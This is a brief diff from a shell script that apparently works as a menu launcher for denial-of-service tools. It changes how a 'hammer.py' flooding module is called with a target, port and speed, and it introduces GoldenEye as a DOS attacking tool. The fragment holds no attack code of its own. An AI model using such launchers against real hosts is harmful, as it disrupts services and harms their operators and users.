@@ -72,7 +72,7 @@ echo ""
 echo "Select your turbo speed :p ex: 666"
 echo ""
 read TARGETHAMMER3
-python3 modules/hammer.py -s $TARGETHAMMER -p $TARGETHAMMER2 -t $TARGETHAMMER3
+cd modules && python3 hammer.py -s $TARGETHAMMER -p $TARGETHAMMER2 -t $TARGETHAMMER3
 ;;
 3)
 echo "GoldenEye is also a simple but effective DOS attacking tool. "
